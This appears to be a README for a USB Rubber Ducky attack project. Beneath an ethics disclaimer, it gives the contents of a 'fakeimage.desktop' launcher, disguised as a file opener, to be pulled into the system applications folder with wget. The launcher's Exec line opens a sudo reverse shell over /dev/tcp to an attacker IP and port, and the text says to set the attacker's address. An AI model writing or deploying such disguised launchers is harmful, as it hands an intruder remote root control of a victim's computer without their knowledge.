# Rubber-Ducky-Scripts
**Disclaimer:** Engaging in activities involving compromised scripts, unauthorized access, or any form of potentially harmful actions is strictly prohibited. The use of such scripts without explicit authorization is both unethical and illegal. It is crucial to adhere to ethical guidelines, respect the law, and prioritize the security and privacy of computer systems. The information provided here is intended for educational and informative purposes only. If you are in an academic or learning environment and wish to explore cybersecurity topics, it is essential to obtain explicit permission from relevant authorities and conduct experiments in a controlled, legal, and ethical manner. Always follow best practices, participate in legal and educational platforms, and ensure that your actions contribute positively to the field of cybersecurity. Unauthorized and unethical activities may result in severe consequences, including legal action and academic penalties. 
## Rubber-Ducky-Scripts
For this project you will need the following files<br> 
**fakeimage.desktop** (Save this file on a remote site or any accessible link - For this project we will use wget to pull this file into the location /usr/local/share/applications/_)

Contents of the file - Include details and save file as fakeimage.desktop <br>
**[Desktop Entry] <br>
Encoding=UTF-8 <br>
Name=Open_Custom_File <br>
Exec=sudo /bin/bash -i > /dev/tcp/192.168.145.146/4444 0<&1 2>&1 <br>
Terminal=true <br>
Type=Application <br>
Icon=notebook** <br>
Change IP Address to attacker machine
